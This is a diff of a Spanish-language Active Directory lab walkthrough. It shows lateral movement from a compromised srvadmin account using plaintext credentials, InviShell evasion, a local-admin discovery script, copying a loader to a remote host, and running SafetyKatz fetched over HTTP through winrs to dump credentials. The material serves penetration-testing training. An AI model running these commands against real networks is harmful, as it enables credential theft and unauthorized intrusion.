@@ -670,34 +670,40 @@ Y despues lo ejecutaremows
 Encontrando las credenciales en texto claro del usuario *dcorp-srvadmin::TheKeyUs3ron@anyMachine!*
 Ahora iniciaremos un nuevo proceso con los privilegios de *srvadmin*
 ```shell
+[student99]
 runas /user:dcorp\srvadmin /netonly cmd
 ```
 
 Iniciaremos una *InviShell*
 ```shell
+[newShell as srvadmin privileges]
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 
 Cargaremos *Find-PSRemotingLocalAdminAcces* para ver sobre que otras maquinas tenemos privilegios de Administrador
 ```shell
+[newShell as srvadmin privileges - PS]
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
 ```
 
 Y lo ejecutamos
 ```shell
+[newShell as srvadmin privileges - PS]
 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 ```
 
 Obteniendo como respuesta que tenemos privilegios de administrador en *dcorp-mgmt*
-Tambien sabemos que en esa maquina tambien esta presente una sesion de *dcorp-svcadmin*.
+También sabemos que en esa maquina también esta presente una sesion de *dcorp-svcadmin*.
 Utilizaremos *SafetyKatz* para extraer las credenciales de la maquina *dcorp-mgmt*, primero nos transferiremos el *Loader* a la maquina
+Primero tendremos que hacer un exit de la *PowerShell*
 ```shell
-[newShell as srvadmin privileges]
+[newShell as srvadmin privileges - CMD]
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
 Una vez copiado el *Loader* ejecutaremos *SafetyKatz* a traves de *winrs*
 ```shell
-winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
+
+winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.97:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
